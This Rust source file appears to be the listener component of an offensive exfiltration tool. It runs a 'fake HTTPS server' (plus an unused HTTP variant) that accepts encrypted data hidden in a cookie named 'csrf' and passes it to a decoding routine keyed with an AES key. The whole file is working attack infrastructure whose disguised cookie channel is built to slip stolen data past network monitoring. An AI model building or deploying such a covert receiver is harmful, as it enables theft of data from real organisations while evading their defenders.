use crate::args::*;
extern crate lazy_static;
use lazy_static::lazy_static;
use std::sync::Mutex;

use log::{info,debug,trace};
use colored::Colorize;
use std::collections::HashMap;

use actix_web::{web, middleware, App, HttpServer, HttpRequest, HttpResponse, Error};
use openssl::ssl::{SslAcceptor, SslFiletype, SslMethod};

use crate::utils::extract::get_data;

// Get key for AES decode and id/data hashmap
lazy_static!{
   static ref GLOBAL_KEY: String = {
      let common_args = extract_args();
      common_args.key
   };
   static ref ID_DATA: Mutex<HashMap<String, String>> = Mutex::new(HashMap::new());
}

/// Function to analyze request in /
async fn index(
   req: HttpRequest
) -> Result<HttpResponse, Error> {
   
   // Log 200 request
   trace!("Request:\n{:?}",req);
   let key = GLOBAL_KEY.to_string();
   //trace!("Key: {}",key);
   let mut _map = ID_DATA.lock().unwrap();

   // If csrf cookie is set then try to extract datas
   if let Some(cookie) = req.cookie("csrf") {
      debug!("Received data from csrf cookie: {:?}", cookie.value());
      get_data(
         cookie.value().to_string(),
         &mut _map,
         &key,
      )
   }

   // Return ok to client
   Ok(HttpResponse::Ok()
       .content_type("text/plain")
       .body("Ok"))
}

/// Simple HTTPS server with actix-web
pub async fn https_exfiltrator(
   https_ip: &String,
   https_port: &String,
   private_cert: &String,
   public_cert: &String,
) -> std::io::Result<()> {
   info!("Starting fake HTTPS server on {}",format!("{}:{}",https_ip,https_port).to_string().bold().green());

   // load TLS keys
   let mut builder = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
   builder.set_private_key_file(private_cert, SslFiletype::PEM)      .unwrap();
   builder.set_certificate_chain_file(public_cert).unwrap();

   HttpServer::new(|| {
      App::new()
         // enable logger
         .wrap(middleware::Logger::default())
         // register simple handler, handle all methods
         .service(web::resource("/index.html").to(index))
         // with path parameters
         .service(web::resource("/").to(index))
   })
   .bind_openssl(format!("{}:{}",https_ip,https_port), builder)?
   .run()
   .await
}

/// Simple HTTP server with actix-web (not used)
pub async fn http_exfiltrator(
   http_ip: &String,
   http_port: &String,
   _key: &String,
) -> std::io::Result<()> {
   info!("Starting fake HTTPS server on {}",format!("{}:{}",http_ip,http_port).to_string().bold().green());
   HttpServer::new(|| {
      App::new()
         // enable logger
         .wrap(middleware::Logger::default())
         // register simple handler, handle all methods
         .service(web::resource("/index.html").to(index))
         // with path parameters
         .service(web::resource("/").to(index))
   })
   .bind(format!("{}:{}",http_ip,http_port))?
   .run()
   .await
}